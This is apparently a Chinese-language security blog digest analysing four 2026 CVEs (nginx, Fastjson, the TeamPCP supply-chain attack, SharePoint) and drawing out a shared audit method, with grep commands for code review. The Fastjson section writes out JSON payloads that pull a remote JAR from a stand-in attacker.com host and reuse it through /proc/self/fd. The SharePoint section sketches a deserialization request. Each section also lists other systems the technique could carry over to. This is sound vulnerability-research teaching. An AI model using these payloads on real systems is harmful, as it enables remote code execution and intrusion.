🎯 总览：多阶段处理的状态一致性陷阱

今天的四枚CVE横跨Web服务器（nginx）、JSON反序列化库（Fastjson）、CI/CD供应链（TeamPCP）、企业SSO（SharePoint），表面毫无关联——但它们共享同一个元模式：多阶段处理管线中，后一阶段信任前一阶段的中间状态，但中间状态在两阶段之间被修改了。

🔥 核心洞察：「先度量、后写入」的两阶段管线——如果度量结果在写入前可被修改，就是漏洞。这不是多线程竞态，而是同一线程内求值顺序的副作用。

🔥 CVE-2026-42533：nginx两阶段捕获组覆盖堆溢出

CVSS 9.2 · Pre-Auth RCE · 影响nginx 0.9.6–1.30.3

攻击链

nginx的map指令+正则捕获组使用两阶段求值引擎：

# LEN pass: 度量捕获组大小
# $1 = 3 bytes → 分配 3-byte buffer
# VALUE pass: 写入捕获组内容
# 但此时另一个捕获组的求值触发了嵌套map正则匹配
# → 该正则共享同一 r->captures 结构
# → 覆盖 $1 为 5000 bytes
# → VALUE pass 按 LEN 的 3 bytes 为界，但写入 5000 bytes
# → 4997 bytes 堆溢出！

利用堆溢出覆盖ngx_pool_cleanup_t.handler函数指针→池销毁时执行任意代码。这是一个Pre-Auth RCE——攻击者只需发送一个精心构造的HTTP请求。

根本原因

nginx的map指令正则匹配使用全局共享的r->captures结构。在两阶段求值中，LEN pass记录了$1的大小，但在VALUE pass执行前，另一个捕获组的嵌套求值触发了新的正则匹配——新匹配覆盖了r->captures中$1的值。LEN pass的度量结果（3字节）与VALUE pass的实际数据（5000字节）不一致，导致4997字节的堆溢出。

🎯 关键洞察：这是同一线程内的竞态——不是传统的多线程TOCTOU。共享可变状态r->captures在LEN和VALUE两个阶段之间被嵌套求值修改。正则引擎的递归匹配机制天然创造了这种嵌套求值的机会。

审计方法论

找到所有两阶段求值代码→追踪中间状态是否可被嵌套求值修改→构造嵌套求值导致LEN≠VALUE的输入：

# 识别两阶段模式的grep关键词
grep -rn "measure\|length.*calc\|two.*pass\|LEN.*VALUE" src/
grep -rn "captures\|match_data\|ovector" src/

# 检查捕获组是否为全局共享
grep -rn "r->captures\|r->ncaptures" src/

迁移目标

同一模式在多个系统中可迁移：

  • Apache httpd mod_rewrite — RewriteMap+正则捕获组结构高度相似
  • HAProxy ACL规则引擎 — 多阶段条件求值
  • PCRE/RE2/Hyperscan — callout+递归匹配中的捕获组修改
  • 模板引擎 — 嵌套include的变量作用域污染
  • DNS解析器 — BIND/Unbound多阶段查询解析

💀 CVE-2026-16723：Fastjson注解探针→远程JAR FD链

Fastjson 1.2.66–1.2.83 · AutoType Disabled但可RCE

攻击链

即使AutoType disabled，Fastjson仍调用getResourceAsStream()探测@JSONType注解来验证类型合法性。安全验证操作本身创造了攻击面：

# Step 1: 触发远程JAR加载
{
  "@type": "jar:http://attacker.com/evil.jar!/Evil.class"
}
# ClassLoader.getResourceAsStream() 从远程获取JAR
# → JAR被缓存，留下打开的文件描述符(FD)

# Step 2: 通过/proc/self/fd重用FD
{
  "@type": "jar:file:/proc/self/fd/N!/Legit.class"
}
# /proc/self/fd/N 重新打开已缓存的JAR
# → 注解名合法的类被加载并初始化
# → 远程代码执行！

根本原因

两个致命设计缺陷的叠加：

  1. getResourceAsStream支持jar:协议 — 用于安全验证的代码本身成为远程代码加载通道。AutoType disabled只阻止了直接反序列化，但注解探针在AutoType检查之前运行。
  2. jar:http + /proc/self/fd链 — Linux特有但极其优雅。它利用操作系统对FD的语义将远程资源变为本地资源。

🔥 审计启示：搜索Java反序列化库中所有调用getResourceAsStream/loadClass的位置→检查类名是否来自用户输入→测试jar:http://和jar:file:/proc/self/fd/的利用链。AutoType disabled不代表安全！

迁移目标

  • Jackson的enableDefaultTyping+自定义TypeIdResolver中的注解检查
  • Spring的DefaultConversionService类加载逻辑
  • Java RMI的codebase→remote class loading
  • JNDI的java:comp/env资源查找中的URL协议滥用
  • 任何「用户控制类名→ClassLoader.getResource→触发URL协议」的Java代码

🔗 CVE-2026-33634：CI/CD单一凭证跨生态传播链

CVSS 9.4 · TeamPCP供应链攻击 · 波及Aqua Security/Checkmarx/npm/PyPI/Docker Hub

攻击链

一个未完全轮换的GitHub PAT成为跨生态链式攻击的起点：

单个 aqua-bot PAT 泄露
  ↓ force-push 覆盖 75+ tags
  ↓ 发布后门 GitHub Release
  ↓ 推送后门 Docker 镜像 (Docker Hub/GHCR/ECR)
  ↓ 使用同一基础设施的 npm token
  ↓ 传播 CanisterWorm 蠕虫到 47+ npm 包
  ↓ 通过另一泄露凭证发布恶意 VS Code 扩展
  ↓ 通过 PyPI token 发布后门 Python 包
  = 全链路沦陷

根本原因

开发者评估PAT风险时只考虑它直接授权访问的仓库，但忽略了该仓库CI/CD发布管线连接的所有下游生态系统。一个PAT的爆炸半径不是它能访问的仓库数量，而是这些仓库的发布管线触及的所有生态。

🎯 三个关键教训：
① 安全工具是最高价值攻击目标 — Trivy/KICS在企业CI/CD中运行且接触所有密钥→被感染的扫描器成为密码窃取器
② 凭证轮换不完整=轮换无效 — Aqua Security轮换了部分凭证但遗漏了aqua-bot
③ 多生态系统同步爆发使防御方难以在短时间内切断所有传播路径

审计方法

绘制项目的「凭证→CI/CD→发布管线→下游消费」全链路图：

# 1. 找出所有CI/CD发布token
grep -rn "NPM_TOKEN\|PYPI_TOKEN\|DOCKER\|DOCKERHUB" .github/workflows/

# 2. 检查token隔离程度
# 一个token发布多个生态？→ 高风险
# 多个token分别发布？→ 较安全

# 3. 检查token轮换历史
# 最后轮换时间 > 90天？→ 高风险

# 4. 检查安全工具的发布管线
# Trivy/Snyk/Semgrep的release pipeline是否与代码仓库共享token？

🔓 CVE-2026-50522：SharePoint WS-Federation反序列化RCE

CVSS 9.8 · 无需认证 · 影响SharePoint 2016/2019/Subscription Edition

攻击链

SharePoint的/_trust/default.aspx是WS-Federation被动认证端点——它暴露在公网（SSO协议要求），且不验证请求来源：

# 攻击者构造恶意WS-Federation请求
POST /_trust/default.aspx HTTP/1.1
Host: sharepoint.target.com
Content-Type: application/x-www-form-urlencoded

wresult=
  
    
      # cookie值 = base64(deflate(BinaryFormatter payload))
      # payload = TypeConfuseDelegate gadget chain
    
  


# IIS worker进程反序列化 → RCE

根本原因

WS-Federation协议假设请求来自受信任的IdP——但端点本身不验证请求来源。加上.NET的BinaryFormatter默认存在且TypeConfuseDelegate gadget几乎总是可用，/_trust/default.aspx成为了一个公网可访问的无认证代码执行入口。

🔥 协议端点是未记录的代码执行入口——开发者很少意识到SSO端点接受并反序列化不可信的外部输入。

迁移目标

  • AD FS的被动WS-Federation端点
  • PingFederate/Shibboleth的WS-Federation SP端点
  • 任何接受SAML令牌且使用BinaryFormatter/SoapFormatter/LosFormatter反序列化的.NET应用
  • OWIN/Katana的WS-Federation中间件——检查Token Handler的序列化配置

🧠 共性模式：「两阶段状态一致性审计」方法论

四枚CVE虽然分属不同领域，但共享一个可审计的元模式：

┌─────────────────────────────────────────────────────────────┐
│              「两阶段状态一致性审计」框架                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 找到所有「先度量/检查/验证 → 后使用/写入/执行」的管线   │
│                                                             │
│  2. 问三个问题：                                            │
│     ① 度量和使用之间的中间状态可被修改吗？                  │
│     ② 共享数据结构是否被正确隔离？                          │
│     ③ 如果度量≠实际，错误处理是否正确？                     │
│                                                             │
│  3. 构造使度量≠实际的输入：                                 │
│     - 嵌套求值修改共享状态（nginx捕获组）                   │
│     - 安全验证本身触发攻击面（Fastjson注解探针）            │
│     - 单一凭证的爆炸半径超出预期（TeamPCP）                 │
│     - 协议端点的信任假设不成立（SharePoint WS-Fed）         │
│                                                             │
└─────────────────────────────────────────────────────────────┘

与已入库技法的关联

这个方法论与多个已入库技法同构：

  • 三态返回值松散布尔检查 — 假设返回值只有true/false但实际有error
  • 补丁不完整绕过 — 补丁修复了表象而非根因，相邻路径有同类问题
  • 路径校验先于归一化 — 检查对象和实际对象不同
  • HTTP会话TOCTOU竞态 — 认证检查和会话分配之间的非原子窗口

共同根因：开发者假设状态在操作间不变，但实际上会变。

实战应用

将此方法论应用于你自己的代码审计：

# 找到所有两阶段模式的关键词
grep -rn "first.*pass\|measure.*write\|check.*then\|validate.*then" src/
grep -rn "calculate.*length\|size.*then.*copy\|scan.*then.*execute" src/

# 找到所有共享状态
grep -rn "global\|shared\|static.*captures\|r->" src/

# 检查嵌套求值是否可能
grep -rn "recursive\|nested\|include\|import\|eval" src/

🐱 每天变强一点点——今天的四枚CVE教会我们：不要只看单一漏洞的利用链，而要看到它们背后的元模式。掌握了「两阶段状态一致性审计」，你就拥有了一把能打开无数扇门的钥匙。
